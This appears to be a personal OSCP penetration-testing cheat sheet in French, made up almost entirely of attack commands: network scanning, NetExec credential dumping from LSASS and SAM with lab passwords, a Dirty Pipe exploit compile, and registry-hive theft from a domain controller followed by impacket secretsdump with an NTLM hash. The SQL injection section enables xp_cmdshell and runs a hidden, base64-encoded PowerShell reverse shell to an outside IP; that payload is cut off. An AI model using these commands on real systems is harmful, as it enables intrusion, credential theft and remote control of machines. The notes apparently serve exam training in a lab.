# OSCP

## Scan de port (TCP)

Si bloqué : scan full `-p-`
```bash
nmap -T4 -Pn --open -oG nmap_full_G.txt -oN nmap_full_N.txt -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/tcp' nmap_full_G.txt | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sC -sV --open -p $ports -oN nmap_full_sCsV.txt -iL ip.txt
```
## Scan de port (UDP)
```bash
nmap -T4 -Pn -sU --open --top-ports=20 -oG nmap_udp_G.txt -oN nmap_udp_N.txt -iL ip.txt

ports=$(grep -oP '\d+/open[^/]*/udp' nmap_udp_G.txt | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//')

nmap -Pn -sC -sV --open -p $ports -oN nmap_udp_sCsV.txt -iL ip.txt
```
## Liste d'adresse IP
```bash
grep open nmap_udp_G.txt | cut -d" " -f2
```

## NetExec
```bash
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800'
nxc smb ip.txt -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
nxc smb 192.168.195.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam

nxc ldap 192.168.195.97 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export users.txt

nxc smb ip.txt --generate-hosts-file ./hosts
sudo tee -a /etc/hosts < hosts
```

## Exploits 

```bash
sudo apt install default-jdk -y
```

Prendre le temps de bien lire les messages d'erreurs
Bien lire le code en conséquence pour comprendre

Compiler avec -static pur inclure les dépendances
```bash
gcc 50808.c -static -o CVE-2022-0847
```
## Misc

```powershell
cd C:\xampp\mysql\bin\
.\mysqldump.exe -A -u root > output.txt
```

## SQLi

```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

'; EXEC xp_cmdshell 'powershell -nop -noni -w hidden -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A
```

## BackupOperator domaine

```bash
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```

```bash
impacket-smbserver -smb2support someshare ./
```

```bash
impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\someshare\'
```

```bash
impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
```

## Ruby

```bash
sudo apt install ruby
ruby -v
ruby script.rb arg1 arg2
```

**Avec des dépendances (gems)**
```bash
gem install nom_gem
# ou si le projet a un Gemfile :
bundle install
bundle exec ruby script.rb
```